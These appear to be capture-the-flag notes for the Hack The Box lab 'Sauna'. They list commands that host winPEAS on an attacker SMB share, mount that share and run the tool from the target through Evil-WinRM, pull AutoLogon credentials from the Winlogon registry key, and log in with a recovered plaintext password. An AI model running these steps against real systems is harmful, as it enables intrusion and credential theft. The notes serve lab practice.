#! /bin/bash

# Winpeas

# put winpeas copy in a folder and then create an SMB share
smbserver.py -username df -password df share . -smb2support

# mount the share from Sauna and go into that directory
*Evil-WinRM* PS C:\> net use \\10.10.14.30\share /u:df df
*Evil-WinRM* PS C:\> cd \\10.10.14.30\share\
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share>

*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share> .\winPEAS.exe cmd fast > sauna_winpeas_fast


# AutoLogon
*Evil-WinRM* PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> get-item -path .

reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
*Evil-WinRM* PS C:\> net user

evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'

